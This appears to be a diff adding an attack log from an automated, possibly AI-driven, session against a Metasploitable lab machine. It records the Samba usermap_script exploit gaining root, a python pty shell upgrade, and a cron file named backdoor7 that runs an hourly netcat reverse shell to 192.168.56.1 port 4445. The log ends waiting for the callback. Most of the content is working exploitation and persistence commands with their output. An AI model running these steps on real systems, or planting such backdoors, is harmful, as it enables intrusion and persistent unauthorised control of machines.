@@ -1,0 +1,98 @@
+--- 2026-04-09 12:00:23 INFO: ---
+
+Command: Attempting Samba usermap_script exploit against 192.168.56.101 ports 139/445...
+Debug: 'Attempting Samba usermap_script exploit against 192.168.56.101 ports 139/445...'
+--- 2026-04-09 12:00:54 INFO: ---
+
+Command: exploit/multi/samba/usermap_script
+
+--- 2026-04-09 12:00:55 INFO: ---
+
+Command: id
+uid=0(root) gid=0(root)
+
+--- 2026-04-09 12:00:55 INFO: ---
+
+Command: samba_shell
+
+--- 2026-04-09 12:00:55 INFO: ---
+
+Command: Samba shell established. Running as: uid=0(root) gid=0(root)
+
+Debug: 'Samba shell established. Running as: uid=0(root) gid=0(root)
+'
+--- 2026-04-09 12:00:55 INFO: ---
+
+Command: include commands
+
+--- 2026-04-09 12:00:55 INFO: ---
+
+Command: samba_shell
+
+--- 2026-04-09 12:00:56 INFO: ---
+
+Command: python -c "import pty;pty.spawn(\"/bin/bash\")";
+python -c "import pty;pty.spawn(\"/bin/bash\")";
+
+--- 2026-04-09 12:00:57 INFO: ---
+
+Command: export SHELL=bash
+export SHELL=bash
+root@metasploitable:/# 
+--- 2026-04-09 12:00:58 INFO: ---
+
+Command: export TERM=xterm256-color
+export TERM=xterm256-color
+root@metasploitable:/# 
+--- 2026-04-09 12:00:59 INFO: ---
+
+Command: stty rows 38 columns 116
+stty rows 38 columns 116
+
+--- 2026-04-09 12:01:00 INFO: ---
+
+Command: export PS1=" >"
+export PS1=" >"
+ >
+--- 2026-04-09 12:01:02 INFO: ---
+
+Command: sleep
+Awake O_O
+--- 2026-04-09 12:01:02 INFO: ---
+
+Command: include commands
+
+--- 2026-04-09 12:01:05 INFO: ---
+
+Command: vim /etc/cron.d/backdoor7
+[38;1H-- VISUAL --[m[38;13H[K[1;1H[38;1H[K[38;1H/etc/cron.d/backdoor7[38;5H[K[38;1H[7msearch hit BOTTOM, continuing at TOPE486: Pattern not found: etc[m[38;29H[K[1;1H
+--- 2026-04-09 12:01:10 INFO: ---
+
+Command: sleep
+Awake O_O
+--- 2026-04-09 12:01:11 INFO: ---
+
+Command: :inoremap jj <ESC>
+[38;1H[K[38;1H:inoremap jj <ESC>[1;1H
+--- 2026-04-09 12:01:13 INFO: ---
+
+Command: sleep
+Awake O_O
+--- 2026-04-09 12:01:14 INFO: ---
+
+Command: 1 * * * * root nc 192.168.56.1 4445 -e /bin/bash
+1 * * * * root nc 192.168.56.1 4445 -e /bin/bash[4;1H[K[4;1H
+--- 2026-04-09 12:01:15 INFO: ---
+
+Command: jj
+
+--- 2026-04-09 12:01:17 INFO: ---
+
+Command: :wq!
+
+:wq!
+
+--- 2026-04-09 12:01:17 INFO: ---
+
+Command: Cron file written via vim. Listener running - waiting for callback
+Debug: 'Cron file written via vim. Listener running - waiting for callback'
